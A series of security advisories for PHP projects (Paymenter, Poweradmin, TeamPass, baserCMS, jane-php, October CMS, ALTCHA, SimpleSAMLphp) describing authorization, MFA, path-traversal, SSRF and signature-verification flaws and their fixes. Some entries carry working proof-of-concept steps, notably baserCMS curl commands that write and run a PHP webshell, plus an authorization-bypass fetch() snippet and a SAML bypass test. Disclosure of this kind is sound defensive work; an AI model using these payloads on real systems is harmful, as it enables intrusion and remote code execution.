entry.title: [paymenter/paymenter] Paymenter: Unauthenticated arbitrary method invocation in Livewire components
entry.content:
Summary

A Livewire function allowed attackers to call any public function, allowing attackers to call any public method on the component. Because an attacker can call any function, they can also overwrite locked data.

Technical Details

app/Livewire/Traits/HasConfirmation.php exposed a public Livewire action that dispatches to any method that exists on the component:

public function executeConfirmedAction($action, $parameters = [])
{
    if (method_exists($this, $action)) {
        return $this->{$action}(...$parameters);
    }
    throw new \Exception("Method {$action} does not exist");
}

The trait is applied on the base component, app/Livewire/Component.php (use Disabled, HasConfirmation, HasNotifications;), so it is present on all 36 client-facing components. executeConfirmedAction is itself invocable, and because it only checks method_exists it re-admits the whole inherited framework API. The most important is InteractsWithProperties::fill(), which uses data_set() and therefore writes any public property, including properties marked #[Locked], and supports dotted paths that reach into hydrated Eloquent models. This was a piece of dead code and has been removed

Impact

An unauthenticated attacker could invoke arbitrary public methods exposed by any client-facing Livewire component through the executeConfirmedAction action.

Depending on the properties and methods exposed by an individual component, this could allow an attacker to bypass intended authorization and data-integrity protections and modify server-side state that was intended to be immutable or protected from client-side manipulation.

References

  • https://github.com/Paymenter/Paymenter/security/advisories/GHSA-prhx-9q2h-ph2x
  • https://nvd.nist.gov/vuln/detail/CVE-2026-103026
  • https://github.com/Paymenter/Paymenter/commit/e0c04af1707a65d8fb91879883aa7eae3292cedc
  • https://github.com/Paymenter/Paymenter/releases/tag/v1.5.7
  • https://github.com/advisories/GHSA-prhx-9q2h-ph2x

entry.title: [poweradmin/poweradmin] Poweradmin: The email second factor is an mt_rand() six-digit code verified with no attempt limit or lockout, so an attacker holding the password can brute-force it within the validity window
entry.content:
Summary

The email second factor is an mt_rand() six-digit code verified with no attempt limit or lockout

The email second factor is a six-digit code drawn from mt_rand() and verified with no attempt limit, so an attacker who already has the password can brute-force it inside its validity window.

lib/Domain/Service/MfaService.php, in generateEmailVerificationCode():

$numericCode = mt_rand(100000, 999999);

That is a 900,000-value space, and mt_rand() is a Mersenne Twister rather than a CSPRNG, so it is not appropriate for a security token in the first place. PHP provides random_int() for exactly this.

The bigger problem is that nothing limits guesses. lib/Application/Controller/MfaVerifyController.php calls:

$isValid = $this->mfaService->verifyCode($userId, $code);

and on failure the only action taken is:

$this->logger->warning('[MfaVerifyController] Verification failed for user ID: {user_id}', ['user_id' => $userId]);

I grepped that controller for any counter, lockout, throttle or rate limit and found nothing beyond log statements. So an attacker holding valid credentials submits codes until one lands. Against 900,000 values with no ceiling on attempts, the only thing standing in the way is the code's validity window and however fast requests can be issued.

That defeats the purpose of the second factor: it is meant to hold even when the password is known, and here it reduces to a race the attacker is likely to win with sustained requests.

Two separate fixes, and I would treat the second as the urgent one:

  1. Generate the code with random_int(100000, 999999) so it is not predictable from RNG state.
  2. Enforce a failed-attempt counter tied to the user and the pending MFA session, invalidating the code and requiring a fresh one after a small number of wrong guesses, plus a per-account and per-IP rate limit on the verify endpoint.

Scope: source-verified at master. I confirmed the generator, the verify call site, the log-only failure handling and the absence of any throttling construct in that controller. I did not stand up a Poweradmin instance and run a brute-force against a live code, so the rate at which the space can be covered in practice is not something I measured. If throttling is applied at a layer I did not look at, such as a web-server or reverse-proxy rule shipped with your deployment docs, then the second half of this weakens considerably and I would want to know that.

I used AI assistance while reading the code and preparing this report.

Confirmed, and thanks for the detail. I've widened the affected range: this reaches back to 4.0.0, where MFA was first added, and 4.4.0 still ships it, so the original <= 4.3.4 was too narrow. The 3.x line has no MFA at all and is unaffected. Fixes are in for 4.2.x, 4.3.x, 4.4.x and the development branch.

To answer your question about other layers, there is nothing. No middleware runs in front of that controller, so what you found missing in the controller is the whole picture.

I've adjusted the score down from 9.1 to 7.4. Walking 900,000 values inside the code's ten minute life needs sustained request rates, and MFA is off by default, so there are real preconditions beyond knowing the password. It is still a second factor that does not hold, which is the point of the report.

The mt_rand swap is in as well, though I would treat that as hardening rather than the bug. Recovering the generator state from these codes is not practical in this setup. The missing attempt limit was the actual problem.

References

  • https://github.com/poweradmin/poweradmin/security/advisories/GHSA-9657-8vc2-7g2p
  • https://nvd.nist.gov/vuln/detail/CVE-2026-115463
  • https://github.com/poweradmin/poweradmin/commit/021e5fea029cf8787247517cde752f9a6af1647c
  • https://github.com/poweradmin/poweradmin/commit/541e31fec32f0eae0d93a13de125a06ee19ecd92
  • https://github.com/poweradmin/poweradmin/commit/ce3ccace7e80f1c1424f1bb1d9ce63a33ee90f19
  • https://github.com/poweradmin/poweradmin/commit/d1c1f23ee27d4607efb616e2d935158b4fc21b61
  • https://github.com/poweradmin/poweradmin/releases/tag/v4.2.6
  • https://github.com/poweradmin/poweradmin/releases/tag/v4.3.5
  • https://github.com/poweradmin/poweradmin/releases/tag/v4.4.1

entry.title: [nilsteampassnet/TeamPass] TeamPass folder re-parenting authorization bypass
entry.content:
Summary

Missing authorization in the update_folder action: any authenticated non-read-only user can rename, re-parent and convert to personal any folder in the instance, moving another team's credential subtree into their own personal space and removing it from the organization. Confirmed at HEAD 2f271cdd (3.2.1.1), and present at 3.1.3.1 and 3.1.7.6.

The defect

The folder-management endpoint dispatches an update_folder action that renames and re-parents a folder. Unlike its sibling actions in the same file, it never checks the edited folder id or the submitted parent id against the caller's accessible-folder set, and the file itself performs no session/authorization gate at all. By pointing the new parent at their own personal folder, an authenticated low-privilege user takes ownership of any folder in the instance.

app/sources/folders.queries.php:

  • The file never calls the session/authorization helpers: a grep for checkSession and userAccessPage across the whole file returns zero hits.
  • case 'update_folder' (lines 294-662) contains no reference to the caller's user-accessible_folders set. The only access-related logic is the personal-folder computation at lines 428-468 and the guard at line 503, which short-circuits on (int) $isPersonal === 1.
  • The sibling actions do carry the check: case 'add_folder' validates against user-accessible_folders at line 743, case 'delete_folders' at line 904, and case 'copy_folder' applies the equivalent parent check.

So update_folder is the one folder-mutating action in the file without an authorization predicate on either the target folder id or the new parent id.

Attacker model and trace

An authenticated TeamPass user who is not read-only (no administrative role required). The attacker submits update_folder with the victim folder's id and a parentId pointing at their own personal folder. Because the new parent is personal, the personal-folder computation sets $isPersonal = 1, which satisfies the line 503 guard, and the update writes the new parent and personal_folder = 1 for the target folder.

Consequences: the stolen subtree is added to the attacker's accessible set on their next login, so the item list renders for them, and do_items_list_in_folder exposes the plaintext label, login, url, email and description of every credential in that subtree (item passwords stay sharekey-protected, hence C:L). Because the folder is now flagged personal, it disappears from the organization view for everyone else including administrators (the admin listing selects only personal_folder = 0), so this is also a denial of access to the real owners.

Verification

Source-verified at HEAD: no session/authorization helper anywhere in the file; the update_folder case contains no accessible-folders predicate while add_folder, delete_folders and copy_folder do; the personal-folder short-circuit at line 503. A live TeamPass instance was not stood up.

Secondary (needs a live confirmation before filing): there appears to be an unauthenticated variant. filter_input(INPUT_POST, 'key') returns null when omitted and $session->get('key') is null on a cookie-less session, so the null !== null comparison fails open; encryptClientServer is only set in public/index.php, so prepareExchangedData takes the plaintext-JSON branch. If that holds on a live instance this rises toward 9.4. The sibling actions fail closed on the anonymous path; only update_folder fails open. Please verify live, or report the authenticated variant alone (which stands on the source reading).

Suggested fix

In the update_folder case, verify that both the target folder id and the submitted parentId are members of the caller's user-accessible_folders set (mirroring add_folder and delete_folders) before applying the update, and reject a re-parent that would flip personal_folder for a folder the caller does not own. Adding the standard session/authorization gate to folders.queries.php as a whole is the more durable fix. Note items.queries.php has a second, identically named update_folder case that does perform the accessible-folders check, but that one can only edit title/complexity; the unguarded copy in folders.queries.php is the one the UI calls for re-parenting.

Tooling

AI assistance was used while investigating, but it was confirmed at HEAD that folders.queries.php contains no checkSession/userAccessPage call, that the update_folder case (lines 294-662) contains no accessible-folders predicate while add_folder (line 743) and delete_folders (line 904) do, and that the personal-folder short-circuit sits at line 503.

References

  • https://github.com/nilsteampassnet/TeamPass/security/advisories/GHSA-66q9-mxf2-xqw6
  • https://nvd.nist.gov/vuln/detail/CVE-2026-103035
  • https://github.com/nilsteampassnet/TeamPass/commit/e022b27f99149995c90a81f83b8e0ae8b48f5a20
  • https://github.com/nilsteampassnet/TeamPass/releases/tag/3.2.1.2

entry.title: [baserproject/baser-core] baserCMS administrative API authorization bypass through session fallback
entry.content:
Summary

An authorization bypass occurs against the API endpoint /baser/api/admin/ by abusing the session authentication fallback.

Details

The mail settings are used here as an example.

Admin side:

https://github.com/baserproject/basercms/blob/master/plugins/baser-core/config/permission.php#L100 With auth => false, it is not accessible with operator privileges.

API side:

https://github.com/baserproject/basercms/blob/master/plugins/baser-core/config/permission.php#L286 With auth => true, it is accessible even with operator privileges.

First, the default group for operators has auth_prefix = 'Admin', which does not include Api/Admin.

https://github.com/baserproject/basercms/blob/master/plugins/baser-core/src/Model/Table/UsersTable.php#L389

Because of this condition, when trying to access the Api/Admin API with a JWT, operators have auth_prefix = 'Admin', so they cannot obtain a JWT and should not be able to access it.

However, there is a problem in getAuthenticationService.

https://github.com/baserproject/basercms/blob/master/plugins/baser-core/src/BaserCorePlugin.php#L507

Here, session authentication is enabled even for the Api/Admin prefix. By accessing the API with a Referer header, session authentication becomes active, allowing access to the API without holding a JWT.

As a result, all APIs configured with auth => true in permission.php become accessible by operators.

PoC

  1. Log in with a site operator (operator) privileged account.
  2. Run the following code in DevTools:
fetch('/baser/api/admin/baser-core/site_configs/view.json', {
  headers: {
    'Referer': location.origin + '/baser/admin/' 
  }
})
.then(r => r.json())
.then(d => {
  console.table(d.siteConfig);
})
### References
  • https://github.com/baserproject/basercms/security/advisories/GHSA-wgvx-x5g3-9v29
  • https://nvd.nist.gov/vuln/detail/CVE-2026-63012
  • https://github.com/baserproject/basercms/commit/2d7f74d3d5d584b9478c210016b81a1b7c30e9fb
  • https://github.com/baserproject/basercms/commit/464227b8770704076ee6eddd4bd464c184786eca
  • https://github.com/baserproject/basercms/releases/tag/5.3.0
  • https://github.com/advisories/GHSA-wgvx-x5g3-9v29

entry.title: [baserproject/baser-core] baserCMS: Path Traversal Bypass via realpath() in BcThemeFileService (CVE-2026-30940 Patch Bypass)
entry.content:
Summary

The security patch introduced in baserCMS 5.2.3 to address CVE-2026-30940 / GHSA-c5c6-37vq-pjcq is incomplete. The patch added a realpath()-based directory traversal check in BcThemeFileService::getFullpath(), but the check is entirely skipped when realpath($baseDir) returns false — which occurs whenever the target subdirectory does not physically exist on disk.

An authenticated administrator can bypass the patch by supplying a type value (e.g., js) that maps to a non-existent directory in the theme. The absence of the directory causes realpath() to return false, the validation block is skipped, and the raw path parameter containing ../ sequences is returned unvalidated. This enables arbitrary file write and remote code execution (RCE) — the exact same impact as the original CVE.

This vulnerability was verified exploitable on baserCMS 5.2.3 (the "patched" version of CVE-2026-30940).

Details

The vulnerability exists in BcThemeFileService::getFullpath() at plugins/bc-theme-file/src/Service/BcThemeFileService.php lines 70–82:

public function getFullpath(string $theme, string $plugin, string $type, string $path)
{
    // ...build $baseDir and $fullPath from $theme, $type, $path...
    $baseDir  = $viewPath . $type . DS;      // e.g. .../BcThemeSample/webroot/js/
    $fullPath = $baseDir  . $path;           // e.g. .../webroot/js/../../../../webroot/

    $resolvedBase = realpath($baseDir);
    if ($resolvedBase !== false) {           // ← BYPASS: entire block skipped when dir absent
        $resolvedBase = rtrim($resolvedBase, DS) . DS;
        $targetDir = realpath(dirname($fullPath));
        if ($targetDir === false) {
            $targetDir = $this->normalizePath(dirname($fullPath));
        }
        if (!str_starts_with(rtrim($targetDir, DS) . DS, $resolvedBase)) {
            throw new BcException(__d('baser_core', 'パスにテーマディレクトリ外への参照が含まれています。'));
        }
    }

    return $fullPath;   // ← Returns unvalidated path when realpath returns false
}

Root cause — the bypass condition:

realpath($baseDir) result Behavior
Valid path string (dir exists) Validation runs → ../ traversal blocked ✓
false (dir does not exist) Validation skipped entirely → ../ traversal allowed ✗

Difference from CVE-2026-30940 (original bug):

CVE-2026-30940 (≤ 5.2.2) This bypass (5.2.3)
Validation None at all realpath() check — but conditional
type needed Any valid type (layout, cell, …) Must map to a non-existent subdirectory
path blocked Never Only when target dir already exists
Root cause Missing validation if ($resolvedBase !== false) skips false case

PoC

Prerequisites:

  • baserCMS 5.2.3 (the officially patched version of CVE-2026-30940)
  • Admin credentials
  • USE_CORE_ADMIN_API=true in .env
  • BcThemeFile plugin installed and BcThemeSample theme loaded

Step 1 — Login and obtain JWT token:

curl -s -X POST "http://localhost/baser/api/admin/baser-core/users/login.json" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@example.com","password":"password"}'
# Response: {"access_token":"eyJ0eXA...","refresh_token":"eyJ0eXA..."}

Step 2 — Verify bypass condition (webroot/js/ must not exist):

The bypass requires type=js to map to a non-existent directory. Confirm:

# webroot/js/ does NOT exist → realpath() returns false → validation SKIPPED
ls plugins/BcThemeSample/webroot/
# Expected output: css  img   (no js/)

Step 3 — Exploit: write PHP webshell directly to webroot:

Path calculation from baseDir = .../BcThemeSample/webroot/js/:

  • js/ (1 up) → webroot/
  • webroot/ (2 up) → BcThemeSample/
  • BcThemeSample/ (3 up) → plugins/
  • plugins/ (4 up) → /var/www/html/ + webroot/
  • Result: ../../../../webroot/ → /var/www/html/webroot/
TOKEN="eyJ0eXA..."   # from step 1

curl -s -X POST "http://localhost/baser/api/admin/bc-theme-file/theme_files/add.json" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "theme":    "BcThemeSample",
    "plugin":   "",
    "type":     "js",
    "path":     "../../../../webroot/",
    "base_name":"rce_direct",
    "ext":      "php",
    "contents": "<?php echo shell_exec($_GET[\"c\"]); ?>"
  }'
# Response: HTTP 200 {"message":"ファイル「rce_direct.php」を作成しました。",...}

Step 4 — Execute RCE:

curl "http://localhost/rce_direct.php?c=id"
# Output: uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)

Verified output (Docker, baserCMS 5.2.3):

=RCE_DIRECT=uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)

Impact

An authenticated administrator can achieve remote code execution by writing an arbitrary PHP file to any directory accessible by the web server — including webroot/, config/, or tmp/. This is the identical impact as CVE-2026-30940, rendering the 5.2.3 patch ineffective.

The vulnerability is particularly significant because:

  1. Patch bypass: Operators and users who upgraded to 5.2.3 specifically to address CVE-2026-30940 remain vulnerable.
  2. Arbitrary directory write: The bypass allows writing to webroot/ (directly HTTP-accessible), config/ (application configuration), or any other directory writable by the PHP process.
  3. File deletion and overwrite: Beyond RCE, the attacker can delete or overwrite critical files, causing denial of service or persistent backdoors.
  4. One-shot per non-existent directory: The exploit creates the target directory as a side effect. Rotating to other unused type values (e.g., font, audio, any arbitrary string) restores the bypass condition.

CVSS v3.1: AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H — Score: 7.2 (High)
Same as CVE-2026-30940 — attack complexity is unchanged by the incomplete patch.

Recommended Fix

The patch must validate the path unconditionally, regardless of whether $baseDir exists on disk. Replace the realpath()-conditional block with normalizePath() (already defined in the same class):

// CURRENT (vulnerable — skips validation when $baseDir does not exist)
$resolvedBase = realpath($baseDir);
if ($resolvedBase !== false) {
    // ... validation only runs here ...
}
return $fullPath;

// FIXED — always validate using normalizePath()
$normalizedBase   = rtrim($this->normalizePath($baseDir),            DS) . DS;
$normalizedTarget = rtrim($this->normalizePath(dirname($fullPath)),  DS) . DS;

if (!str_starts_with($normalizedTarget, $normalizedBase)) {
    throw new BcException(__d('baser_core', 'パスにテーマディレクトリ外への参照が含まれています。'));
}
return $fullPath;

Additionally, the path and ext parameters should be validated at the API controller layer:

// In ThemeFilesController — validate before calling getFullpath()
if (preg_match('/\.\./', $data['path'])) {
    throw new BcException('Invalid path parameter.');
}
if (!preg_match('/^[a-zA-Z0-9]+$/', $data['ext'])) {
    throw new BcException('Invalid extension.');
}

  • CWE-706: Use of Incorrectly-Resolved Name or Reference

entry.title: [jane-php/open-api-3] Jane: $ref resolution performs SSRF + LFI (path traversal) at code-generation time (jane-php)
entry.content:
Summary

jane-php resolves external $ref targets at code-generation time via file_get_contents($ref) (jane-php/json-schema-runtime/Reference.php::doResolve) with no scheme/path restriction. An attacker-controlled OpenAPI document can therefore cause: $ref: 'http://attacker/x' -> SSRF (HTTP GET at gen time; response inlined = RFI); $ref: '/abs/file' -> LFI; $ref: '../secret.yaml' -> path-traversal LFI (CWE-22, arbitrary local JSON/YAML read). Verified 7.11.2/PHP8.1 (listener records the fetch; remote + ../ local content inlined into the generated code). file:// rejected. CWE-918/CWE-98/CWE-611/CWE-22.

Details

// Reference.php::doResolve()
$contents = file_get_contents($fragment); // $fragment = attacker-controlled $ref URI

Impact

Generating PHP with jane from an attacker-influenced OpenAPI document issues HTTP requests to attacker-chosen URLs (SSRF — internal services, cloud metadata) and reads arbitrary local files (LFI via ../), at build/CI time, inlining results into the output.

PoC

reproduce.sh (+ make_spec.py, gen.php): runs jane on a remote-$ref spec (local listener records the SSRF, output checked for the inlined response) and a ../-traversal local-$ref spec (output checked for the leaked file).

Suggested fix

Disable remote $ref fetching by default (or allow-list); confine local $ref to the spec directory (reject absolute paths and ..). Don't file_get_contents($ref) on attacker-controlled URIs.

maintainer-report.txt reproduce.sh gen.php make_spec.py

entry.title: [october/october] October: Media Library Crop Handler Bypasses Upload Extension Allowlist
entry.content:
The Media Library upload handler validates the destination filename against an extension allowlist (default_extensions), rejecting types such as php, phtml, html, and htm. The image crop handler (MediaManager::onCropImage / cropImage) did not perform this check. The destination filename was taken from user input, the extension was extracted from it, and the staged bytes were written to the public media folder under that attacker-chosen extension. Combined with the fact that upload accepts any file contents under an allowlisted extension (a PHP payload disguised as .jpg), and that the zero-dimension crop branch performs a byte-for-byte File::copy rather than re-encoding the pixels, an authenticated backend user with the media.library.create permission could write a file with arbitrary extension and arbitrary contents into the public media folder.

Scope of impact depends on web server configuration. On a default October CMS install (using the shipped Apache .htaccess or nginx.conf), PHP execution from the media folder is blocked, so the realistic outcome is stored XSS via .html or .svg files served from the application origin. On a server that is configured to execute PHP inside the media directory (a non-default but real-world misconfiguration), the same bug becomes remote code execution.

Impact

  • Bypass of the Media Library extension allowlist that the upload path enforces
  • Stored XSS on default installs: attacker can write .html or .svg files served from the application origin, executing script in the browser of any backend user or visitor who opens the file
  • SVG sanitizer bypass: the Html::cleanVector step only runs on the upload path, so uploading malicious SVG content as a .jpg and then cropping it to .svg skips the sanitizer entirely
  • Remote code execution on deployments that execute PHP inside the media folder (non-default)
  • Requires authenticated backend access with the media.library.create permission

Patches

The vulnerability has been patched in v3.7.18 and v4.3.3. The crop handler now applies the same extension allowlist check as the upload handler before staging the output file. As defense in depth, the central MediaLibrary::put and MediaLibrary::putFile write methods now validate the destination extension as well, so any future write path that goes through the library inherits the check. All users are encouraged to upgrade to the latest patched version.

Workarounds

If upgrading immediately is not possible:

  • Restrict the media.library.create permission to fully trusted backend users only
  • Ensure the web server cannot execute PHP from the media storage directory (the shipped .htaccess and nginx.conf already enforce this)

References

  • Reported by nova-aryan

References

  • https://github.com/octobercms/october/security/advisories/GHSA-mqwx-84vv-mp26
  • https://nvd.nist.gov/vuln/detail/CVE-2026-63193
  • https://github.com/octobercms/october/commit/118c3d08559e811c1bf69db7c5ed82a22bcf0bbc

entry.title: [jane-php/open-api-3] Jane: Instantiation RCE via query parameter name -> raw PHPDoc */ breakout (jane-php/open-api-3)
entry.content:
Summary

jane-php (open-api-3) builds PHP via nikic/php-parser (AST), so string literals are escaped -- but PHPDoc comment text is emitted RAW. The generated Client/Endpoint method docblocks embed the query parameter name verbatim in a @param array{ "<name>"?: ... } block. A */ in the query name closes the /** ... */ docblock early and lands in class-body position; because the name is a raw string key (not identifier-mangled), the */ and following PHP survive. Injecting */ public function __construct(){ <code> } /* adds an attacker-controlled __construct to the generated Client class, which runs when the client is instantiated -> RCE (CWE-94). Verified 7.11.2/PHP8.1.

Impact

Generating a client from an attacker-influenced OpenAPI document and using the generated SDK (instantiating the client, which apps do on every call) runs attacker PHP. CWE-94/95/116.

PoC

reproduce.sh (+ make_spec.py, gen.php): scaffolds a composer project with jane-php/open-api-3, generates, instantiates the generated Client, shows the marker.

Suggested fix

Neutralize */ (e.g. */->* /) in all generated PHPDoc text (parameter names, descriptions). Regression-test with a parameter name/description containing */.

maintainer-report.txt reproduce.sh gen.php make_spec.py

entry.title: [altcha-org/altcha] ALTCHA PHP: verifySolution bypasses HMAC signature check when challenge signature is absent
entry.content:
In altcha-org/altcha v2, the verifySolution method skips HMAC signature verification when the signature field is absent from the challenge payload, even when hmacSignatureSecret is configured.

An attacker who strips the signature key from the challenge JSON passes the condition as false, bypassing tamper-detection entirely. The PoW solution check then runs against unverified parameters — allowing an attacker to self-issue a low-difficulty challenge, solve it trivially, and submit a payload that verifies as true.

Impact: Complete CAPTCHA bypass on any deployment that sets hmacSignatureSecret (the recommended production configuration).

Fix: The check was split so that a missing signature is explicitly rejected when a secret is configured.

entry.title: [simplesamlphp/saml2] SAML2: Incomplete fix of CVE-2026-49283: unsigned embedded Response bypasses HTTP-Artifact signature verification (no embedded-Issuer binding)
entry.content:
Summary

CVE-2026-49283 / GHSA-6929-8p9f-26jx ("HTTP-Artifact TLS validator confusion allows cross-IdP authentication bypass") was fixed so that HTTPArtifact::receive() verifies the embedded SAML Response using the IdP metadata signing keys. The current implementation (master 31c72c1d, released v6.2.3) reaches that verification only when the embedded Response is signed:

// src/Binding/HTTPArtifact.php  (receive())
if (!$samlResponse->isSigned()) {
    return $samlResponse;                         // ← unsigned embedded Response returned UNVERIFIED
}
return $this->verifyMessageSignature($samlResponse, $idpMetadata);   // only runs when signed

An attacker who controls one trusted-federation IdP therefore returns a validly-signed outer ArtifactResponse (signed with their own real key, which passes the mandatory outer check) that wraps an unsigned <samlp:Response> whose <Issuer> names a different IdP. isSigned() is false, so verifyMessageSignature() never runs and the forged Response is returned as successfully received. Additionally, even on the signed path verifyMessageSignature() verifies against the artifact issuer's metadata keys but never asserts that the embedded Response's <Issuer> equals the artifact issuer — the same cross-IdP confusion the CVE was assigned for is not closed by identity binding.

This is an incomplete implementation of the fix's own stated goal ("verify signatures using IdP metadata signing keys", commit dac0b4b6 / #419), and a regression introduced by the #414 refactor (v6.2.2) — the official CVE fix in v6.2.1 did not contain this short-circuit.

Affected component

  • src/Binding/HTTPArtifact.php
    • receive() line 206-207: if (!$samlResponse->isSigned()) { return $samlResponse; } — the bypassed guard.
    • receive() line 210: verifyMessageSignature($samlResponse, $idpMetadata) — only reached when signed.
    • verifyMessageSignature() lines 230-286: verifies against $idpMetadata (artifact-issuer keys); no getIssuer() comparison to bind the embedded Response to the artifact issuer.
    • verifyArtifactResponseSignature() line 300-302: if ($artifactResponse->isSigned() !== true) throw — the OUTER response is mandatorily signed; the asymmetry with the embedded return-on-unsigned is the defect.
  • Regression commit 3b589636 (#414, v6.2.2, "refactor/soap-ssl-validator-openssl"); key-source fix dac0b4b6 (#419) left the short-circuit unchanged.
  • Affected: v6.2.2, v6.2.3 (latest), and master. v6.2.1 (official CVE fix) used a deferred-validator model without this short-circuit.

Reachability (hop-by-hop, guards named)

Threat model: SP uses the HTTP-Artifact binding in a multi-IdP federation; attacker operates one trusted IdP-B (valid saml20-idp-remote metadata, real signing key, an ArtifactResolutionService). Goal: impersonate admin@IdP-A.

  1. Attacker hits the SP artifact endpoint with SAMLart encoding sourceId = sha1(IdP-B entityID) — line 137-138, no guard.
  2. getMetaDataConfigForSha1 → $idpMetadata = IdP-B — line 144. Guard: metadata exists → satisfied (IdP-B trusted).
  3. SP resolves against IdP-B's ARS (attacker's endpoint) — line 176-182.
  4. IdP-B returns a validly-signed ArtifactResponse; verifyArtifactResponseSignature(...,IdP-B) passes (signed by the artifact issuer) — line 193/300. Guard satisfied by the attacker (they ARE the artifact issuer).
  5. The signed outer wraps an unsigned <samlp:Response Issuer=IdP-A> with an assertion for admin@IdP-A — line 195, no guard on embedded content.
  6. if (!$samlResponse->isSigned()) return $samlResponse; → TRUE → returns the forged Response unverified — line 206-207. verifyMessageSignature (210) never runs; there is no issuer==artifact-issuer check anywhere in receive().

Every guard on the embedded message is absent; the outer/embedded mandatory-vs-optional asymmetry is the root cause.

Root cause

The #414 refactor moved embedded-Response verification into receive() but gated it on isSigned() (mirroring if (!isSigned()) return instead of the outer's if (isSigned() !== true) throw), and the dac0b4b6 key-source fix did not revisit that gate. The artifact binding's designed trust model is that the embedded message is authenticated by the binding (the assertion need not be individually signed), so a conformant integrator relies on receive() to have authenticated it — exactly the reliance this gap defeats.

Proof of concept (executed, benign)

The PoC exercises the real shipped private methods verifyArtifactResponseSignature() and verifyMessageSignature() via reflection — exactly as the maintainers' own tests/SAML2/Binding/HTTPArtifactTest.php does — and reproduces receive()'s verbatim post-resolution decision (lines 195/206-210) against real HTTPArtifact internals. It models a validly-signed outer ArtifactResponse from the artifact issuer IdP-B (attacker-controlled, its signing cert in metadata) wrapping an unsigned embedded <samlp:Response> claiming Issuer=IdP-A. No destructive payload; the marker is the SKIPPED verification.

Run: vendor/bin/phpunit --no-coverage tests/SAML2/Binding/PocArtifact001Test.php

// tests/SAML2/Binding/PocArtifact001Test.php  (namespace SimpleSAML\Test\SAML2\Binding)
// IdP-B metadata (artifact issuer, attacker-controlled) with a real signing cert:
$idpB = Configuration::loadFromArray(['entityid' => 'https://idp-b.example/', 'keys' => [[
    'type' => 'X509Certificate', 'signing' => true, 'encryption' => false,
    'X509Certificate' => PEMCertificatesMock::getPlainCertificateContents(),
]]], '[idp-b]');
$ha = new HTTPArtifact();

// Forged embedded Response: UNSIGNED, claims Issuer=IdP-A; verify() throws if ever called.
$embedded = $this->createStub(Response::class);
$embedded->method('isSigned')->willReturn(false);
$embedded->method('getSignature')->willReturn(null);
$embedded->method('verify')->willThrowException(new Exception('POC-FAIL: embedded verify() called'));

// Outer ArtifactResponse: validly signed by IdP-B (verify() returns self), wraps the embedded.
$outer = $this->createStub(ArtifactResponse::class);
$outer->method('isSigned')->willReturn(true);
$outer->method('isSuccess')->willReturn(true);
$outer->method('verify')->willReturnCallback(fn() => $outer);
$outer->method('getSignature')->willReturn(self::sigEl());
$outer->method('getMessage')->willReturn($embedded);

// ---- verbatim HTTPArtifact::receive() post-resolution logic ----
$verifiedOuter = $this->call($ha, 'verifyArtifactResponseSignature', $outer, $idpB); // OUTER mandatory — passes vs IdP-B
$samlResponse  = $verifiedOuter->getMessage();
$verifyMessageSignatureCalled = false;
if (!$samlResponse->isSigned()) { $received = $samlResponse; }          // <-- BYPASS (line 206-207)
else { $verifyMessageSignatureCalled = true; $received = $this->call($ha,'verifyMessageSignature',$samlResponse,$idpB); }

self::assertFalse($samlResponse->isSigned());
self::assertFalse($verifyMessageSignatureCalled, 'verifyMessageSignature SKIPPED');
self::assertSame($embedded, $received, 'unsigned embedded Response returned unverified');
// Negative control: the real verifier CANNOT accept the unsigned message → the short-circuit is load-bearing.
$threw = false; try { $this->call($ha,'verifyMessageSignature',$samlResponse,$idpB); } catch (\Throwable $e) { $threw = true; }
self::assertTrue($threw, 'real verifyMessageSignature rejects the unsigned Response');

The five assertions prove: the outer ArtifactResponse verifies against the artifact issuer (IdP-B) metadata; the embedded Response is unsigned; verifyMessageSignature() is skipped; the unsigned embedded Response is returned as received; and the real verifier rejects that same unsigned message — so the isSigned() short-circuit is the sole reason it is accepted.

(Environment note: composer install needed a platform.composer-plugin-api=2.9.0 override with --no-plugins to resolve xml-common's installer-plugin constraint under Composer 2.8.6; no code under test was modified.)

Adversarial re-read (what I tried to refute it with)

  • Strongest objection (why CONDITIONAL, not CONFIRMED): the downstream SimpleSAMLphp SP module may route receive()'s output through the response/assertion processor, which requires either the response signed or every assertion signed (src/Response/Processor.php:155-162) — that would reject the unsigned forged Response and reduce this to defense-in-depth. I cannot confirm or refute this from the saml2 repo alone (the SP module is a different repo). BUT: (i) the artifact binding's whole rationale is that the embedded message need not be individually signed, so integrators relying on the binding will not impose that requirement; (ii) the CVE was assigned against this library and dac0b4b6's stated contract is that receive() authenticates the embedded Response — a contract it fails for unsigned messages; (iii) unlike the redirect mock-key dead-path, the unsigned path is exercised in normal artifact operation, so the missing verification is live, not dead code.
  • Not a false positive on the code: the short-circuit (206-207), the absent issuer binding, and the outer throw vs embedded return asymmetry (300 vs 206) are verbatim in master and released v6.2.3.

Remediation

In receive(), make embedded-Response authentication mandatory and issuer-bound — mirror the outer pattern: after line 195, reject unless $samlResponse->isSigned() and verifyMessageSignature() succeeds and $samlResponse->getIssuer()?->getContent()->getValue() === $idpMetadata->getString('entityid'). Replace if (!isSigned()) return with if (isSigned() !== true) throw.

Confidence

High at the library-contract level — the incomplete-fix is code-verified and the PoC fires against the real shipped verification methods. CONDITIONAL only for the end-to-end auth bypass (requires the HTTP-Artifact binding in use and an integrator relying on the binding to authenticate the embedded message — the binding's designed trust model). Reported to the maintainers as a gap in their own dac0b4b6 fix, present in the latest release v6.2.3.

Proof-of-Concept source (PocArtifact001Test.php)

<?php

declare(strict_types=1);

namespace SimpleSAML\Test\SAML2\Binding;

use Exception;
use PHPUnit\Framework\TestCase;
use ReflectionMethod;
use SimpleSAML\Configuration;
use SimpleSAML\SAML2\Binding\HTTPArtifact;
use SimpleSAML\SAML2\XML\samlp\ArtifactResponse;
use SimpleSAML\SAML2\XML\samlp\Response;
use SimpleSAML\XMLSecurity\TestUtils\PEMCertificatesMock;

/**
 * PoC — SAML2-ARTIFACT-001: incomplete fix of CVE-2026-49283.
 *
 * HTTPArtifact::receive() contains (master 31c72c1d / released v6.2.3):
 *     $artifactResponse = $this->verifyArtifactResponseSignature($artifactResponse, $idpMetadata); // OUTER: mandatory
 *     $samlResponse = $artifactResponse->getMessage();
 *     ...
 *     if (!$samlResponse->isSigned()) {
 *         return $samlResponse;                                    // <-- EMBEDDED: returned UNVERIFIED
 *     }
 *     return $this->verifyMessageSignature($samlResponse, $idpMetadata);
 *
